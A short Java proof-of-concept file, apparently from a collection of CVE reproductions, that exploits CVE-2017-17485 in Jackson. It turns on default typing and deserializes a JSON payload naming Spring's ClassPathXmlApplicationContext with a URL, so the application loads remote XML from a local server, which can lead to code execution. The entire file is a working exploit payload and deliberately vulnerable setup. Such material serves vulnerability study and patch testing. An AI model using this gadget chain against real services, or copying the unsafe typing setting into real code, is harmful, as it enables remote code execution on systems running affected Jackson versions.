package com.yyjccc.jackson.vul;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * @author  yyjccc
 * @time    2024-2-23
 * @components  jackson
 * @cve CVE-2017-17485
 * @description jackson反序列化漏洞ClassPathXmlApplicationContext利用链
 * @version
 * <pre>
 * Jackson 2.7系列 < 2.7.9.2
 * Jackson 2.8系列 < 2.8.11
 * Jackson 2.9系列 < 2.9.4
 * </pre>
 */
public class ClassPathXmlGadget {
	public static void main(String[] args) {

		String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\", \"http://127.0.0.1:7777/spel.xml\"]";
		ObjectMapper mapper = new ObjectMapper();
		mapper.enableDefaultTyping();
		try {
			mapper.readValue(payload, Object.class);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

}
